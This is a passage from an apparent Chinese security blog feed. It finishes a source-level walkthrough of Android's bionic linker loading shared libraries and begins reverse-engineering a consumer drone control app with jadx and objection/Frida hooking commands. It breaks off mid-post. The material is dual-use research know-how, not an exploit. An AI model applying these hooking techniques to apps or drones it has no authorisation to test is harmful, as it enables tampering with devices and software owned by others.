class="number">3348</span>          android_relocs_[<span class="number">1</span>] == <span class="string">&#x27;P&#x27;</span> &amp;&amp;</span><br><span class="line"><span class="number">3349</span>          android_relocs_[<span class="number">2</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp;</span><br><span class="line"><span class="number">3350</span>          android_relocs_[<span class="number">3</span>] == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line"><span class="number">3351</span>        DEBUG(<span class="string">&quot;[ android relocating %s ]&quot;</span>, get_realpath());</span><br><span class="line"><span class="number">3352</span>  </span><br><span class="line"><span class="number">3353</span>        <span class="type">bool</span> relocated = <span class="literal">false</span>;</span><br><span class="line"><span class="number">3354</span>        <span class="type">const</span> <span class="type">uint8_t</span>* packed_relocs = android_relocs_ + <span class="number">4</span>;</span><br><span class="line"><span class="number">3355</span>        <span class="type">const</span> <span class="type">size_t</span> packed_relocs_size = android_relocs_size_ - <span class="number">4</span>;</span><br><span class="line"><span class="number">3356</span>  </span><br><span class="line"><span class="number">3357</span>        relocated = relocate(</span><br><span class="line"><span class="number">3358</span>            version_tracker,</span><br><span class="line"><span class="number">3359</span>            packed_reloc_iterator&lt;sleb128_decoder&gt;(</span><br><span class="line"><span class="number">3360</span>              sleb128_decoder(packed_relocs, packed_relocs_size)),</span><br><span class="line"><span class="number">3361</span>            global_group, local_group);</span><br><span class="line"><span class="number">3362</span>  </span><br><span class="line"><span class="number">3363</span>        <span class="keyword">if</span> (!relocated) &#123;</span><br><span class="line"><span class="number">3364</span>          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">3365</span>        &#125;</span><br><span class="line"><span class="number">3366</span>      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">3367</span>        DL_ERR(<span class="string">&quot;bad android relocation header.&quot;</span>);</span><br><span class="line"><span class="number">3368</span>        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">3369</span>      &#125;</span><br><span class="line"><span class="number">3370</span>    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="2-20-relocate"><a href="#2-20-relocate" class="headerlink" title="2.20 relocate()"></a>2.20 relocate()</h2><p>根据不同的条件给<code>relocate()</code>函数传入不同的参数。<code>relocate()</code>函数内部同样也是switch…case…结构，根据不同的type修改reloc表、符号表等，还有修改系统函数、全局/静态变量的绝对地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">2497</span>  template&lt;typename ElfRelIteratorT&gt;</span><br><span class="line"><span class="number">2498</span>  <span class="type">bool</span> <span class="title function_">soinfo::relocate</span><span class="params">(<span class="type">const</span> VersionTracker&amp; version_tracker, ElfRelIteratorT&amp;&amp; rel_iterator,</span></span><br><span class="line"><span class="params"><span class="number">2499</span>                        <span class="type">const</span> <span class="type">soinfo_list_t</span>&amp; global_group, <span class="type">const</span> <span class="type">soinfo_list_t</span>&amp; local_group)</span> &#123;</span><br><span class="line"><span class="number">2500</span>    <span class="keyword">for</span> (<span class="type">size_t</span> idx = <span class="number">0</span>; rel_iterator.has_next(); ++idx) &#123;</span><br><span class="line"><span class="number">2501</span>      <span class="type">const</span> <span class="keyword">auto</span> rel = rel_iterator.next();</span><br><span class="line"><span class="number">2502</span>      <span class="keyword">if</span> (rel == nullptr) &#123;</span><br><span class="line"><span class="number">2503</span>        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">2504</span>      &#125;</span><br><span class="line"><span class="number">2505</span>  </span><br><span class="line"><span class="number">2506</span>      ElfW(Word) type = ELFW(R_TYPE)(rel-&gt;r_info);</span><br><span class="line"><span class="number">2507</span>      ElfW(Word) sym = ELFW(R_SYM)(rel-&gt;r_info);</span><br><span class="line"><span class="number">2508</span>  </span><br><span class="line"><span class="number">2509</span>      ElfW(Addr) reloc = static_cast&lt;ElfW(Addr)&gt;(rel-&gt;r_offset + load_bias);</span><br><span class="line"><span class="number">2510</span>      ElfW(Addr) sym_addr = <span class="number">0</span>;</span><br><span class="line"><span class="number">2511</span>      <span class="type">const</span> <span class="type">char</span>* sym_name = nullptr;</span><br><span class="line"><span class="number">2512</span>      ElfW(Addr) addend = get_addend(rel, reloc);</span><br><span class="line">...</span><br><span class="line"><span class="number">2620</span>      <span class="keyword">switch</span> (type) &#123;</span><br><span class="line"><span class="number">2621</span>        <span class="keyword">case</span> R_GENERIC_JUMP_SLOT:</span><br><span class="line"><span class="number">2622</span>          count_relocation(kRelocAbsolute);</span><br><span class="line"><span class="number">2623</span>          MARK(rel-&gt;r_offset);</span><br><span class="line"><span class="number">2624</span>          TRACE_TYPE(RELO, <span class="string">&quot;RELO JMP_SLOT %16p &lt;- %16p %s\n&quot;</span>,</span><br><span class="line"><span class="number">2625</span>                     reinterpret_cast&lt;<span class="type">void</span>*&gt;(reloc),</span><br><span class="line"><span class="number">2626</span>                     reinterpret_cast&lt;<span class="type">void</span>*&gt;(sym_addr + addend), sym_name);</span><br><span class="line"><span class="number">2627</span>  </span><br><span class="line"><span class="number">2628</span>          *reinterpret_cast&lt;ElfW(Addr)*&gt;(reloc) = (sym_addr + addend);</span><br><span class="line"><span class="number">2629</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">2630</span>        <span class="keyword">case</span> R_GENERIC_GLOB_DAT:</span><br><span class="line"><span class="number">2631</span>          count_relocation(kRelocAbsolute);</span><br><span class="line"><span class="number">2632</span>          MARK(rel-&gt;r_offset);</span><br><span class="line"><span class="number">2633</span>          TRACE_TYPE(RELO, <span class="string">&quot;RELO GLOB_DAT %16p &lt;- %16p %s\n&quot;</span>,</span><br><span class="line"><span class="number">2634</span>                     reinterpret_cast&lt;<span class="type">void</span>*&gt;(reloc),</span><br><span class="line"><span class="number">2635</span>                     reinterpret_cast&lt;<span class="type">void</span>*&gt;(sym_addr + addend), sym_name);</span><br><span class="line"><span class="number">2636</span>          *reinterpret_cast&lt;ElfW(Addr)*&gt;(reloc) = (sym_addr + addend);</span><br><span class="line"><span class="number">2637</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">2638</span>        <span class="keyword">case</span> R_GENERIC_RELATIVE:</span><br><span class="line"><span class="number">2639</span>          count_relocation(kRelocRelative);</span><br><span class="line"><span class="number">2640</span>          MARK(rel-&gt;r_offset);</span><br><span class="line"><span class="number">2641</span>          TRACE_TYPE(RELO, <span class="string">&quot;RELO RELATIVE %16p &lt;- %16p\n&quot;</span>,</span><br><span class="line"><span class="number">2642</span>                     reinterpret_cast&lt;<span class="type">void</span>*&gt;(reloc),</span><br><span class="line"><span class="number">2643</span>                     reinterpret_cast&lt;<span class="type">void</span>*&gt;(load_bias + addend));</span><br><span class="line"><span class="number">2644</span>          *reinterpret_cast&lt;ElfW(Addr)*&gt;(reloc) = (load_bias + addend);</span><br><span class="line"><span class="number">2645</span>          <span class="keyword">break</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="2-21-call-constructors"><a href="#2-21-call-constructors" class="headerlink" title="2.21 call_constructors()"></a>2.21 call_constructors()</h2><p>回调到<code>do_dlopen()</code>，执行<code>call_constructors()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker_soinfo.cpp</span></span><br><span class="line"><span class="number">388</span>  <span class="type">void</span> <span class="title function_">soinfo::call_constructors</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="number">389</span>    <span class="keyword">if</span> (constructors_called) &#123;</span><br><span class="line"><span class="number">390</span>      <span class="keyword">return</span>;</span><br><span class="line"><span class="number">391</span>    &#125;</span><br><span class="line"><span class="number">392</span>  </span><br><span class="line"><span class="number">393</span>    <span class="comment">// We set constructors_called before actually calling the constructors, otherwise it doesn&#x27;t</span></span><br><span class="line"><span class="number">394</span>    <span class="comment">// protect against recursive constructor calls. One simple example of constructor recursion</span></span><br><span class="line"><span class="number">395</span>    <span class="comment">// is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so:</span></span><br><span class="line"><span class="number">396</span>    <span class="comment">// 1. The program depends on libc, so libc&#x27;s constructor is called here.</span></span><br><span class="line"><span class="number">397</span>    <span class="comment">// 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so.</span></span><br><span class="line"><span class="number">398</span>    <span class="comment">// 3. dlopen() calls the constructors on the newly created</span></span><br><span class="line"><span class="number">399</span>    <span class="comment">//    soinfo for libc_malloc_debug_leak.so.</span></span><br><span class="line"><span class="number">400</span>    <span class="comment">// 4. The debug .so depends on libc, so CallConstructors is</span></span><br><span class="line"><span class="number">401</span>    <span class="comment">//    called again with the libc soinfo. If it doesn&#x27;t trigger the early-</span></span><br><span class="line"><span class="number">402</span>    <span class="comment">//    out above, the libc constructor will be called again (recursively!).</span></span><br><span class="line"><span class="number">403</span>    constructors_called = <span class="literal">true</span>;</span><br><span class="line"><span class="number">404</span>  </span><br><span class="line"><span class="number">405</span>    <span class="keyword">if</span> (!is_main_executable() &amp;&amp; preinit_array_ != nullptr) &#123;</span><br><span class="line"><span class="number">406</span>      <span class="comment">// The GNU dynamic linker silently ignores these, but we warn the developer.</span></span><br><span class="line"><span class="number">407</span>      PRINT(<span class="string">&quot;\&quot;%s\&quot;: ignoring DT_PREINIT_ARRAY in shared library!&quot;</span>, get_realpath());</span><br><span class="line"><span class="number">408</span>    &#125;</span><br><span class="line"><span class="number">409</span>  </span><br><span class="line"><span class="number">410</span>    get_children().for_each([] (soinfo* si) &#123;</span><br><span class="line"><span class="number">411</span>      si-&gt;call_constructors();</span><br><span class="line"><span class="number">412</span>    &#125;);</span><br><span class="line"><span class="number">413</span>  </span><br><span class="line"><span class="number">414</span>    <span class="keyword">if</span> (!is_linker()) &#123;</span><br><span class="line"><span class="number">415</span>      bionic_trace_begin((<span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">&quot;calling constructors: &quot;</span>) + get_realpath()).c_str());</span><br><span class="line"><span class="number">416</span>    &#125;</span><br><span class="line"><span class="number">417</span>  </span><br><span class="line"><span class="number">418</span>    <span class="comment">// DT_INIT should be called before DT_INIT_ARRAY if both are present.</span></span><br><span class="line"><span class="number">419</span>    call_function(<span class="string">&quot;DT_INIT&quot;</span>, init_func_, get_realpath());</span><br><span class="line"><span class="number">420</span>    call_array(<span class="string">&quot;DT_INIT_ARRAY&quot;</span>, init_array_, init_array_count_, <span class="literal">false</span>, get_realpath());</span><br><span class="line"><span class="number">421</span>  </span><br><span class="line"><span class="number">422</span>    <span class="keyword">if</span> (!is_linker()) &#123;</span><br><span class="line"><span class="number">423</span>      bionic_trace_end();</span><br><span class="line"><span class="number">424</span>    &#125;</span><br><span class="line"><span class="number">425</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-22-call-function"><a href="#2-22-call-function" class="headerlink" title="2.22 call_function()"></a>2.22 call_function()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker_soinfo.cpp</span></span><br><span class="line"><span class="number">346</span>  <span class="type">static</span> <span class="type">void</span> <span class="title function_">call_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* function_name __unused,</span></span><br><span class="line"><span class="params"><span class="number">347</span>                            <span class="type">linker_dtor_function_t</span> function,</span></span><br><span class="line"><span class="params"><span class="number">348</span>                            <span class="type">const</span> <span class="type">char</span>* realpath __unused)</span> &#123;</span><br><span class="line"><span class="number">349</span>    <span class="keyword">if</span> (function == nullptr || reinterpret_cast&lt;<span class="type">uintptr_t</span>&gt;(function) == static_cast&lt;<span class="type">uintptr_t</span>&gt;(<span class="number">-1</span>)) &#123;</span><br><span class="line"><span class="number">350</span>      <span class="keyword">return</span>;</span><br><span class="line"><span class="number">351</span>    &#125;</span><br><span class="line"><span class="number">352</span>  </span><br><span class="line"><span class="number">353</span>    TRACE(<span class="string">&quot;[ Calling d-tor %s @ %p for &#x27;%s&#x27; ]&quot;</span>, function_name, function, realpath);</span><br><span class="line"><span class="number">354</span>    function();</span><br><span class="line"><span class="number">355</span>    TRACE(<span class="string">&quot;[ Done calling d-tor %s @ %p for &#x27;%s&#x27; ]&quot;</span>, function_name, function, realpath);</span><br><span class="line"><span class="number">356</span>  &#125;</span><br><span class="line"><span class="number">357</span>  </span><br><span class="line"><span class="number">358</span>  template &lt;typename F&gt;</span><br><span class="line"><span class="number">359</span>  <span class="type">static</span> <span class="type">void</span> <span class="title function_">call_array</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* array_name __unused,</span></span><br><span class="line"><span class="params"><span class="number">360</span>                         F* functions,</span></span><br><span class="line"><span class="params"><span class="number">361</span>                         <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params"><span class="number">362</span>                         <span class="type">bool</span> reverse,</span></span><br><span class="line"><span class="params"><span class="number">363</span>                         <span class="type">const</span> <span class="type">char</span>* realpath)</span> &#123;</span><br><span class="line"><span class="number">364</span>    <span class="keyword">if</span> (functions == nullptr) &#123;</span><br><span class="line"><span class="number">365</span>      <span class="keyword">return</span>;</span><br><span class="line"><span class="number">366</span>    &#125;</span><br><span class="line"><span class="number">367</span>  </span><br><span class="line"><span class="number">368</span>    TRACE(<span class="string">&quot;[ Calling %s (size %zd) @ %p for &#x27;%s&#x27; ]&quot;</span>, array_name, count, functions, realpath);</span><br><span class="line"><span class="number">369</span>  </span><br><span class="line"><span class="number">370</span>    <span class="type">int</span> begin = reverse ? (count - <span class="number">1</span>) : <span class="number">0</span>;</span><br><span class="line"><span class="number">371</span>    <span class="type">int</span> end = reverse ? <span class="number">-1</span> : count;</span><br><span class="line"><span class="number">372</span>    <span class="type">int</span> step = reverse ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line"><span class="number">373</span>  </span><br><span class="line"><span class="number">374</span>    <span class="keyword">for</span> (<span class="type">int</span> i = begin; i != end; i += step) &#123;</span><br><span class="line"><span class="number">375</span>      TRACE(<span class="string">&quot;[ %s[%d] == %p ]&quot;</span>, array_name, i, functions[i]);</span><br><span class="line"><span class="number">376</span>      call_function(<span class="string">&quot;function&quot;</span>, functions[i], realpath);</span><br><span class="line"><span class="number">377</span>    &#125;</span><br><span class="line"><span class="number">378</span>  </span><br><span class="line"><span class="number">379</span>    TRACE(<span class="string">&quot;[ Done calling %s for &#x27;%s&#x27; ]&quot;</span>, array_name, realpath);</span><br><span class="line"><span class="number">380</span>  &#125;</span><br></pre></td></tr></table></figure><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h1><p>大致流程如下（从linker层开始）：</p><ol><li>Linker优先从内存中查找已加载的SO，如果SO已加载，则直接返回handle。</li><li>如果SO没有加载，需要新建soinfo结构体，并将SO加载到内存。</li><li>执行预加载<code>prelink_image()</code>，读取SO中dynamic字段中的内容，初始化重定位需要的数据。</li><li>执行<code>link_image()</code>，修复内存中的数据，完成重定位。</li><li>执行SO中的Init以及Initarray中的函数。</li></ol><img src="/posts/203cba03/111.png" class="">]]></content>
    
    
    <summary type="html">&lt;p&gt;在&lt;a href=&quot;https://v5le0n9.github.io/posts/15be101a.html#6-%E7%BC%96%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AAso&quot;&gt;安卓逆向入门教程 6. 编写第一个so&lt;/a&gt;中知道，要想调用某个so库中的Native方法，需要将so库加载进来。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;myJNI&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;　　&lt;span class=&quot;comment&quot;&gt;//加载so库&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        System.loadLibrary(&lt;span class=&quot;string&quot;&gt;&amp;quot;JniTest&amp;quot;&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;//so库名字，全称为libJniTest.so&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;　　&lt;span class=&quot;comment&quot;&gt;//native方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;native&lt;/span&gt; String &lt;span class=&quot;title function_&quot;&gt;sayHello&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;;&lt;span class=&quot;comment&quot;&gt;//调用so库中的sayHello()方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SJ F PRO v2.4.5无人机App分析</title>
    <link href="http://example.com/posts/ac4cb042.html"/>
    <id>http://example.com/posts/ac4cb042.html</id>
    <published>2022-08-24T13:44:15.795Z</published>
    <updated>2022-11-17T06:35:44.017Z</updated>
    
    <content type="html"><![CDATA[<p>第一次尝试对无人机App分析，这个是纯对App进行分析，参考度较低，建议结合<a href="https://v5le0n9.github.io/posts/8a5081f6.html">无人机漏洞挖掘学习</a>食用。</p><span id="more"></span><h1 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h1><p>无人机型号：F7 4K PRO</p><p>App：SJ F PRO v2.4.5</p><p>安卓手机要求：</p><ul><li>Android系统4.4及以上，运行内存1G及以上</li><li>拥有WIFI，GPS定位模块</li><li>使用过程中不能开启VPN等网络管理工具，否则会导致手机与无人机之间不能通讯</li></ul><p>两器一机开机步骤：</p><ol><li>点按遥控器电源开关按键查看当前电量，再次点按开机。遥控器显示“CONNECTING_”，发出“嘀-，嘀嘀”声。</li><li>长按飞行器电源3s，发出“嘚嘚嘚，嘚-，嘚-”声，前后指示灯快闪 -&gt; 红灯慢闪，进入对频状态。</li><li>遥控器发出“嘀”声，显示“GPS MODE”，后绿前白交替慢闪，对频成功。</li><li>开启手机WIFI功能，选择WIFI“SJ-F-PRO-<em>*</em>-BRG”，可能会显示“已连接，但无法访问互联网”，不用管。打开App，进入“控制”界面。</li><li>遥控器两边手杆推向内上，后绿前白快闪。App显示“进入罗盘校准”。</li><li>水平拿起飞行器转一圈，遥控器发出“嘀”声，后绿常亮。</li><li>拿起飞行器头朝上转一圈，遥控器发出“嘀”声，前红白灯慢闪。App显示“罗盘校准成功”。</li><li>将飞行器放置水平面，后绿前白慢闪，进入搜星状态。App显示“正在等待GPS信号”。后绿前白常亮，GPS搜星成功。</li><li>遥控器两边手杆推向外上，后蓝前白快闪，App显示“陀螺仪校准完成”。</li><li>遥控器两边手杆推向内下，电机自动解锁启动，直接推油门杆起飞。（取消电机解锁：两边手杆推向内下，电机停止工作。或解锁后无操作20s自动停止工作。）</li><li>后绿前白常亮，App显示“可以起飞”。</li></ol><p>若GPS信号较差，在步骤8时一直处于搜星状态，此时如果想要起飞，长按遥控器上的“速度切换”功能键(左一)5s，关闭GPS功能。后绿闪烁前白常亮，无人机切换到姿态模式，可以起飞，但GPS所有功能关闭。</p><p>两器一机关机步骤：</p><ol><li>长按飞行器电源3s关机。</li><li>点按遥控器电源，再长按3s关机。</li></ol><h1 id="2-查看基本信息"><a href="#2-查看基本信息" class="headerlink" title="2. 查看基本信息"></a>2. 查看基本信息</h1><p>首先来查看关于这个APK的基本信息。将该APK载入jadx查看它的包名与入口Activity。</p><img src="/posts/ac4cb042/2.1.1.png" class=""><p>启动frida-server，打开App，对该App进行objection。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.vison.macrochip.sj.f.pro explore</span><br></pre></td></tr></table></figure><p>查看该App所有的Activities：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list activities</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/2.1.2.png" class=""><p>已知入口Activity为<code>com.vison.macrochip.sj.f.pro.activity.WelcomeActivity</code>，我们可以尝试用intent进入其它Activity：</p><img src="/posts/ac4cb042/2.1.3.png" class=""><img src="/posts/ac4cb042/2.1.4.png" class=""><img src="/posts/ac4cb042/2.1.5.png" class=""><img src="/posts/ac4cb042/2.1.6.png" class=""><img src="/posts/ac4cb042/2.1.7.png" class=""><img src="/posts/ac4cb042/2.1.8.png" class=""><img src="/posts/ac4cb042/2.1.9.png" class=""><img src="/posts/ac4cb042/2.1.10.png" class=""><img src="/posts/ac4cb042/2.1.11.png" class=""><p>经过intent后大致知道了哪个Activity对应哪个界面，我们重点关注<code>com.vison.macrochip.sj.gps.pro.activity.ControlFActivity</code>和<code>com.vison.macrochip.sj.gps.pro.activity.ControlHyActivity</code>，因为它们是飞行器的两种飞行控制模式，一种是GPS模式，另一种是姿态模式。</p><p>可以通过hooking找到对应关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class com.vison.macrochip.sj.gps.pro.activity.ControlHyActivity  --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/2.1.12.png" class=""><p>点击“控制”按钮，界面左上方显示“搜星中…”，表示GPS模式。使用<code>ControlHyActivity</code>成功hook上。</p><img src="/posts/ac4cb042/2.1.13.png" class=""><p>此时可以知道<code>com.vison.macrochip.sj.gps.pro.activity.ControlHyActivity</code>是GPS模式，而<code>com.vison.macrochip.sj.gps.pro.activity.ControlFActivity</code>对应的是姿态模式。</p><h1 id="3-WelcomeActivity-onCreate"><a href="#3-WelcomeActivity-onCreate" class="headerlink" title="3. WelcomeActivity.onCreate()"></a>3. WelcomeActivity.onCreate()</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">       ProtocolEnum protocolEnum;</span><br><span class="line">       TextView textView;</span><br><span class="line">       String str;</span><br><span class="line">       <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">       V();</span><br><span class="line">       setContentView(R.layout.activity_welcome);<span class="comment">//给activity设置一个layout布局</span></span><br><span class="line">       ButterKnife.a(<span class="built_in">this</span>);</span><br><span class="line">       <span class="built_in">this</span>.productNameTv.setOnClickListener(<span class="built_in">this</span>);<span class="comment">//监听点击事件</span></span><br><span class="line">       <span class="built_in">this</span>.learnBtn.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">       <span class="built_in">this</span>.supportBtn.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">       <span class="built_in">this</span>.videoEditorBtn.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">       c.g.a.h.f.B = n.d().b();<span class="comment">//B是静态成员整型变量</span></span><br><span class="line">       c.g.a.h.f.R = Boolean.FALSE;<span class="comment">//R是静态成员布尔变量</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> c.g.a.h.f.B;</span><br><span class="line">       <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</span><br><span class="line">           <span class="built_in">this</span>.productNameTv.setText(u[<span class="number">1</span>]);</span><br><span class="line">           c.g.a.h.f.Q = ProtocolEnum.SJ;</span><br><span class="line">           c.g.a.h.f.R = Boolean.TRUE;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">               textView = <span class="built_in">this</span>.productNameTv;</span><br><span class="line">               str = u[<span class="number">2</span>];</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">               textView = <span class="built_in">this</span>.productNameTv;</span><br><span class="line">               str = u[<span class="number">3</span>];</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="built_in">this</span>.productNameTv.setText(u[<span class="number">0</span>]);</span><br><span class="line">               protocolEnum = ProtocolEnum.SJ;</span><br><span class="line">               c.g.a.h.f.Q = protocolEnum;</span><br><span class="line">           &#125;</span><br><span class="line">           textView.setText(str);</span><br><span class="line">           protocolEnum = ProtocolEnum.HACK_FLY;</span><br><span class="line">           c.g.a.h.f.Q = protocolEnum;</span><br><span class="line">       &#125;</span><br><span class="line">       f0();</span><br><span class="line">       <span class="built_in">this</span>.y.sendEmptyMessageDelayed(<span class="number">2017</span>, <span class="number">500L</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>ProtocolEnum</code>数据类型是一个枚举类型。</p><img 